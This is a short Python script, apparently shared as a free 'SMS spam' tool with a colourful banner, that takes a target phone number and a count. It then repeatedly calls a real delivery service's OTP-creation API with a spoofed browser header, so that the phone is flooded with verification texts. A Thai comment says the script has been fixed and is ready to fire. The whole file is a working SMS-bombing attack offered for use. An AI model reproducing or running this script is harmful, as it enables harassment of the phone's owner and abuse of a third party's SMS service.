import requests,time

print("""
\033[31;38;1m  ░██████╗██████╗░░█████╗░███╗░░░███╗░░░░░░██████╗███╗░░░███╗░██████╗░░░░░██╗░░░██╗██████╗░ 
  ██╔════╝██╔══██╗██╔══██╗████╗░████║░░░░░██╔════╝████╗░████║██╔════╝░░░░░██║░░░██║╚════██╗ 
  ╚█████╗░██████╔╝███████║██╔████╔██║░░░░░╚█████╗░██╔████╔██║╚█████╗░░░░░░╚██╗░██╔╝░░███╔═╝ 
  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║░░░░░░╚═══██╗██║╚██╔╝██║░╚═══██╗░░░░░░╚████╔╝░██╔══╝░░ 
  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║░░░░░██████╔╝██║░╚═╝░██║██████╔╝░░░░░░░╚██╔╝░░███████╗ 
  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░░░░░░░░░╚═╝░░░╚══════╝ 
  
\033[31;38;36m                    ╔══════════════════════════╗
\033[31;38;36m                      [SMS FREE BY MASTER TG]
\033[31;38;36m                            Free Free
\033[31;38;36m	                   It's free, man.
\033[31;38;36m                    ╚══════════════════════════╝
                            
""")

no = input('example : 08xx\n[👉] number: ')
jml = int(input('[👉] quantity: '))

heder = {'Host': 'api2.1112.com',
'content-length': '44',
'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
}

##ตัวนี้แก้แล้วครับยิงได้เลย
data = {"phonenumber": f"{no}","language":"th"}

print("\n[Sending]")
for i in range(jml):
      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. number {no}')
      else:
           print(f'{i+1}. number {no}')
      time.sleep(2.0)
      
#เครดิตSCK
